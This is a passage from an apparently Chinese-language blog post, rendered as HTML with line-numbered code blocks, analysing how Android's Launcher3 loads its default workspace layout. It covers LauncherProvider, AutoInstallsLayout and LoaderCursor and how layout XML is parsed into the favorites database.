class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">loadDefaultFavoritesIfNecessary</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">SharedPreferences</span> <span class="variable">sp</span> <span class="operator">=</span> Utilities.getPrefs(getContext());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sp.getBoolean(mOpenHelper.getKey(EMPTY_DATABASE_CREATED), <span class="literal">false</span>)) &#123;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;loading default workspace&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">AppWidgetHost</span> <span class="variable">widgetHost</span> <span class="operator">=</span> mOpenHelper.newLauncherWidgetHost();</span><br><span class="line">            <span class="comment">// 获取布局，</span></span><br><span class="line">        <span class="type">AutoInstallsLayout</span> <span class="variable">loader</span> <span class="operator">=</span> createWorkspaceLoaderFromAppRestriction(widgetHost);</span><br><span class="line">        <span class="keyword">if</span> (loader == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取布局，下面分析 AutoInstallsLayout </span></span><br><span class="line">            loader = AutoInstallsLayout.get(getContext(),widgetHost, mOpenHelper);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (loader == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Partner</span> <span class="variable">partner</span> <span class="operator">=</span> Partner.get(getContext().getPackageManager());</span><br><span class="line">            <span class="keyword">if</span> (partner != <span class="literal">null</span> &amp;&amp; partner.hasDefaultLayout()) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Resources</span> <span class="variable">partnerRes</span> <span class="operator">=</span> partner.getResources();</span><br><span class="line">                <span class="type">int</span> <span class="variable">workspaceResId</span> <span class="operator">=</span> partnerRes.getIdentifier(Partner.RES_DEFAULT_LAYOUT,</span><br><span class="line">                        <span class="string">&quot;xml&quot;</span>, partner.getPackageName());</span><br><span class="line">                <span class="keyword">if</span> (workspaceResId != <span class="number">0</span>) &#123;</span><br><span class="line">                    loader = <span class="keyword">new</span> <span class="title class_">DefaultLayoutParser</span>(getContext(), mOpenHelper.mAppWidgetHost,</span><br><span class="line">                            mOpenHelper, partnerRes, workspaceResId);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">usingExternallyProvidedLayout</span> <span class="operator">=</span> loader != <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (loader == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取布局</span></span><br><span class="line">            loader = getDefaultLayoutParser(widgetHost);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创一个数据库</span></span><br><span class="line">        mOpenHelper.createEmptyDB(mOpenHelper.getWritableDatabase());</span><br><span class="line">        <span class="comment">// xml文件的内容解析并放入数据库；没理解错，就是把：xml布局文件放到数据库中，重点在 loadFavorites()</span></span><br><span class="line">        <span class="keyword">if</span> ((mOpenHelper.loadFavorites(mOpenHelper.getWritableDatabase(), loader) &lt;= <span class="number">0</span>)</span><br><span class="line">                &amp;&amp; usingExternallyProvidedLayout) &#123;</span><br><span class="line">            <span class="comment">// Unable to load external layout. Cleanup and load the internal layout.</span></span><br><span class="line">            mOpenHelper.createEmptyDB(mOpenHelper.getWritableDatabase());</span><br><span class="line">            mOpenHelper.loadFavorites(mOpenHelper.getWritableDatabase(),</span><br><span class="line">                    getDefaultLayoutParser(widgetHost));</span><br><span class="line">        &#125;</span><br><span class="line">        clearFlagEmptyDbCreated();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面代码可知： <strong>loadDefaultFavoritesIfNecessary()</strong> 方法的作用为：获取 loader (布局)，和将读取的布局存入数据库。</p><p>获取 <strong>AutoInstallsLayout</strong> 方法，首先获取 <strong>layoutName</strong> ，这个名字就是xml名字。在原生代码 <strong>res/xml/</strong> 文件夹下面有 <strong>default_workspace.xml 、default_workspace_3x3.xml、 default_workspace_4x4.xml、default_workspace_5x5.xml、default_workspace_5x6.xml</strong> 一共5个布局文件。</p><p>下面则是采用 <strong>多个方式</strong> 来获取布局 xml，因为不知道 xml 文件的具体名字所以采用递进的方法来获取。</p><p><strong>先看第一种</strong>：应用约束，调用 <strong>createWorkspaceLoaderFromAppRestriction()</strong> ，获取用户设置的一组用于限制应用功能的 Bundle 串，获取 Bundle 里 <strong>workspace.configuration.package.name</strong> 具体的应用包名，获取 WorkSpace 默认配置资源。 <strong>LauncherProvider#createWorkspaceLoaderFromAppRestriction(widgetHost)</strong> :</p><p><strong>packages/apps/Launcher3/src/com/android/launcher3/LauncherProvider.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> AutoInstallsLayout <span class="title function_">createWorkspaceLoaderFromAppRestriction</span><span class="params">(AppWidgetHost widgetHost)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> getContext();</span><br><span class="line">    <span class="keyword">final</span> String authority;</span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(mProviderAuthority)) &#123;</span><br><span class="line">        authority = mProviderAuthority;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        authority = Settings.Secure.getString(ctx.getContentResolver(),</span><br><span class="line">                <span class="string">&quot;launcher3.layout.provider&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (TextUtils.isEmpty(authority)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ProviderInfo</span> <span class="variable">pi</span> <span class="operator">=</span> ctx.getPackageManager().resolveContentProvider(authority, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (pi == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 找不到权限的提供者</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取布局 Uri</span></span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> getLayoutUri(authority, ctx);</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> ctx.getContentResolver().openInputStream(uri)) &#123;</span><br><span class="line">        <span class="comment">// 阅读完整的 xml，以便在出现任何 IO 错误时尽早失败</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(IOUtils.toByteArray(in));</span><br><span class="line">        <span class="type">XmlPullParser</span> <span class="variable">parser</span> <span class="operator">=</span> Xml.newPullParser();</span><br><span class="line">        parser.setInput(<span class="keyword">new</span> <span class="title class_">StringReader</span>(layout));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AutoInstallsLayout</span>(ctx, widgetHost, mOpenHelper,</span><br><span class="line">                ctx.getPackageManager().getResourcesForApplication(pi.applicationInfo),</span><br><span class="line">                () -&gt; parser, AutoInstallsLayout.TAG_WORKSPACE);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;Error getting layout stream from: &quot;</span> + authority , e);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>再看第二种</strong>：从 intent 关键字 <strong>ACTION_LAUNCHER_CUSTOMIZATION</strong> 即是 <strong>“android.autoinstalls.config.action.PLAY_AUTO_INSTALL”</strong> 来获取，autoinstall 可以在手机中集成对应工具，这样默认布局除了手机自带的应用外，还可以提供一些自动下载的应用。</p><p><strong>AutoInstallsLayout#get()</strong> :<br><strong>packages/apps/Launcher3/src/com/android/launcher3/AutoInstallsLayout.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> AutoInstallsLayout <span class="title function_">get</span><span class="params">(Context context, AppWidgetHost appWidgetHost,</span></span><br><span class="line"><span class="params">        LayoutParserCallback callback)</span> &#123;</span><br><span class="line">    Pair&lt;String, Resources&gt; customizationApkInfo = PackageManagerHelper.findSystemApk(</span><br><span class="line">            ACTION_LAUNCHER_CUSTOMIZATION, context.getPackageManager());</span><br><span class="line">    <span class="keyword">if</span> (customizationApkInfo == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">pkg</span> <span class="operator">=</span> customizationApkInfo.first;</span><br><span class="line">    <span class="type">Resources</span> <span class="variable">targetRes</span> <span class="operator">=</span> customizationApkInfo.second;</span><br><span class="line">    <span class="type">InvariantDeviceProfile</span> <span class="variable">grid</span> <span class="operator">=</span> LauncherAppState.getIDP(context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里得到的布局名字为：default_layout_%dx%d_h%s </span></span><br><span class="line">    <span class="type">String</span> <span class="variable">layoutName</span> <span class="operator">=</span> String.format(Locale.ENGLISH, FORMATTED_LAYOUT_RES_WITH_HOSTEAT,</span><br><span class="line">            grid.numColumns, grid.numRows, grid.numDatabaseHotseatIcons);</span><br><span class="line">    <span class="type">int</span> <span class="variable">layoutId</span> <span class="operator">=</span> targetRes.getIdentifier(layoutName, <span class="string">&quot;xml&quot;</span>, pkg);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里得到的布局名字为：default_layout_%dx%d</span></span><br><span class="line">    <span class="keyword">if</span> (layoutId == <span class="number">0</span>) &#123;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Formatted layout: &quot;</span> + layoutName</span><br><span class="line">                + <span class="string">&quot; not found. Trying layout without hosteat&quot;</span>);</span><br><span class="line">        layoutName = String.format(Locale.ENGLISH, FORMATTED_LAYOUT_RES,</span><br><span class="line">                grid.numColumns, grid.numRows);</span><br><span class="line">        layoutId = targetRes.getIdentifier(layoutName, <span class="string">&quot;xml&quot;</span>, pkg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里得到的布局名字为：default_layout</span></span><br><span class="line">    <span class="keyword">if</span> (layoutId == <span class="number">0</span>) &#123;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Formatted layout: &quot;</span> + layoutName + <span class="string">&quot; not found. Trying the default layout&quot;</span>);</span><br><span class="line">        layoutId = targetRes.getIdentifier(LAYOUT_RES, <span class="string">&quot;xml&quot;</span>, pkg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (layoutId == <span class="number">0</span>) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;Layout definition not found in package: &quot;</span> + pkg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把有关信息保存在AutoInstallsLayout，返回给调用的程序.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AutoInstallsLayout</span>(context, appWidgetHost, callback, targetRes, layoutId,</span><br><span class="line">            TAG_WORKSPACE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总之： <strong>AutoInstallsLayout.get() 根据传入的参数，读取对应的xml文件</strong>。</p><p><strong>再看第三种</strong>：从系统内置的 partner 应用里获取workspace默认配置。 这种就不过多介绍了。</p><p><strong>看第四种</strong>：是最常用的一种，我们能控制的本地布局，调用 getDefaultLayoutParser() 获取我们 Launcher 里的默认资源。</p><p><strong>packages/apps/Launcher3/src/com/android/launcher3/LauncherProvider.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> DefaultLayoutParser <span class="title function_">getDefaultLayoutParser</span><span class="params">(AppWidgetHost widgetHost)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">defaultLayout</span> <span class="operator">=</span> LauncherAppState.getIDP(getContext()).defaultLayoutId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultLayoutParser</span>(getContext(), widgetHost,</span><br><span class="line">            mOpenHelper, getContext().getResources(), defaultLayout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>packages/apps/Launcher3/src/com/android/launcher3/LauncherAppState.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> InvariantDeviceProfile <span class="title function_">getIDP</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> LauncherAppState.getInstance(context).getInvariantDeviceProfile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>loadDefaultFavoritesIfNecessary()</strong> 方法又分为：读取布局、存储布局。</p><p>存储布局的主要方法是： <strong>loadFavorites()</strong> ，由于文章过于长了，这里就不在作分析了。</p><h4 id="2-获取数据库信息"><a href="#2-获取数据库信息" class="headerlink" title="2. 获取数据库信息"></a>2. 获取数据库信息</h4><p>回到开始的 <strong>LoaderTask#loadWorkspace()</strong> 方法。</p><blockquote><p>该类剩下部分的代码还是非常多，后面将拆开分析。</p></blockquote><p><strong>LoaderTask#loadWorkspace()</strong><br><strong>packages/apps/Launcher3/src/com/android/launcher3/LauncherProvider.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">loadWorkspace</span><span class="params">(</span></span><br><span class="line"><span class="params">        List&lt;ShortcutInfo&gt; allDeepShortcuts,</span></span><br><span class="line"><span class="params">        Uri contentUri,</span></span><br><span class="line"><span class="params">        String selection,</span></span><br><span class="line"><span class="params">        <span class="meta">@Nullable</span> LoaderMemoryLogger logger)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略部门代码......</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (mBgDataModel) &#123;</span><br><span class="line">        mBgDataModel.clear();</span><br><span class="line">        mPendingPackages.clear();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> HashMap&lt;PackageUserKey, SessionInfo&gt; installingPkgs =</span><br><span class="line">                mSessionHelper.getActiveSessions();</span><br><span class="line">        installingPkgs.forEach(mApp.getIconCache()::updateSessionCache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">PackageUserKey</span> <span class="variable">tempPackageKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PackageUserKey</span>(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        mFirstScreenBroadcast = <span class="keyword">new</span> <span class="title class_">FirstScreenBroadcast</span>(installingPkgs);</span><br><span class="line"></span><br><span class="line">        Map&lt;ShortcutKey, ShortcutInfo&gt; shortcutKeyToPinnedShortcuts = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重点关注 ****** LoaderCursor() *******</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">LoaderCursor</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LoaderCursor</span>(</span><br><span class="line">                contentResolver.query(contentUri, <span class="literal">null</span>, selection, <span class="literal">null</span>, <span class="literal">null</span>), contentUri,</span><br><span class="line">                mApp, mUserManagerState);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Bundle</span> <span class="variable">extras</span> <span class="operator">=</span> c.getExtras();</span><br><span class="line">        mDbName = extras == <span class="literal">null</span></span><br><span class="line">                ? <span class="literal">null</span> : extras.getString(LauncherSettings.Settings.EXTRA_DB_NAME);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 这下面是补充一些需要获取的参数，这些对象会反复使用</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">appWidgetIdIndex</span> <span class="operator">=</span> c.getColumnIndexOrThrow(</span><br><span class="line">                    LauncherSettings.Favorites.APPWIDGET_ID);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">appWidgetProviderIndex</span> <span class="operator">=</span> c.getColumnIndexOrThrow(</span><br><span class="line">                    LauncherSettings.Favorites.APPWIDGET_PROVIDER);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">spanXIndex</span> <span class="operator">=</span> c.getColumnIndexOrThrow</span><br><span class="line">                    (LauncherSettings.Favorites.SPANX);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">spanYIndex</span> <span class="operator">=</span> c.getColumnIndexOrThrow(</span><br><span class="line">                    LauncherSettings.Favorites.SPANY);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">rankIndex</span> <span class="operator">=</span> c.getColumnIndexOrThrow(</span><br><span class="line">                    LauncherSettings.Favorites.RANK);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">optionsIndex</span> <span class="operator">=</span> c.getColumnIndexOrThrow(</span><br><span class="line">                    LauncherSettings.Favorites.OPTIONS);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 省略部门代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">```        </span><br><span class="line"></span><br><span class="line">上述代码创建了 **LoaderCursor** 游标，用于暂时存储从数据库中提取的数据块，且创建是根据 table 名字来获取对应的数据库 **table**， 这里的名字是 **Favorites**。</span><br><span class="line">接着看下 **LoaderCursor** 的构造方法： **LoaderCursor#LoaderCursor()**</span><br><span class="line"></span><br><span class="line">**packages/apps/Launcher3/src/com/android/launcher3/model/LoaderCursor.java**</span><br><span class="line">```java</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LoaderCursor</span><span class="params">(Cursor cursor, Uri contentUri, LauncherAppState app,</span></span><br><span class="line"><span class="params">        UserManagerState userManagerState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(cursor);</span><br><span class="line"></span><br><span class="line">    allUsers = userManagerState.allUsers;</span><br><span class="line">    mContentUri = contentUri;</span><br><span class="line">    mContext = app.getContext();</span><br><span class="line">    mIconCache = app.getIconCache();</span><br><span class="line">    mIDP = app.getInvariantDeviceProfile();</span><br><span class="line">    mPM = mContext.getPackageManager();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化列索引</span></span><br><span class="line">    iconIndex = getColumnIndexOrThrow(LauncherSettings.Favorites.ICON);</span><br><span class="line">    iconPackageIndex = getColumnIndexOrThrow(LauncherSettings.Favorites.ICON_PACKAGE);</span><br><span class="line">    iconResourceIndex = getColumnIndexOrThrow(LauncherSettings.Favorites.ICON_RESOURCE);</span><br><span class="line">    titleIndex = getColumnIndexOrThrow(LauncherSettings.Favorites.TITLE);</span><br><span class="line"></span><br><span class="line">    idIndex = getColumnIndexOrThrow(LauncherSettings.Favorites._ID);</span><br><span class="line">    containerIndex = getColumnIndexOrThrow(LauncherSettings.Favorites.CONTAINER);</span><br><span class="line">    itemTypeIndex = getColumnIndexOrThrow(LauncherSettings.Favorites.ITEM_TYPE);</span><br><span class="line">    screenIndex = getColumnIndexOrThrow(LauncherSettings.Favorites.SCREEN);</span><br><span class="line">    cellXIndex = getColumnIndexOrThrow(LauncherSettings.Favorites.CELLX);</span><br><span class="line">    cellYIndex = getColumnIndexOrThrow(LauncherSettings.Favorites.CELLY);</span><br><span class="line">    profileIdIndex = getColumnIndexOrThrow(LauncherSettings.Favorites.PROFILE_ID);</span><br><span class="line">    restoredIndex = getColumnIndexOrThrow(LauncherSettings.Favorites.RESTORED);</span><br><span class="line">    intentIndex = getColumnIndexOrThrow(LauncherSettings.Favorites.INTENT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个构造器，定义了数据库中的所有词条，后面则使用这些词条来获取相应参数。</p><p>回到 <strong>loadWorkspace()</strong> ，看后面的部分。<br><strong>LoaderTask#loadWorkspace()</strong><br><strong>packages/apps/Launcher3/src/com/android/launcher3/LauncherProvider.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span 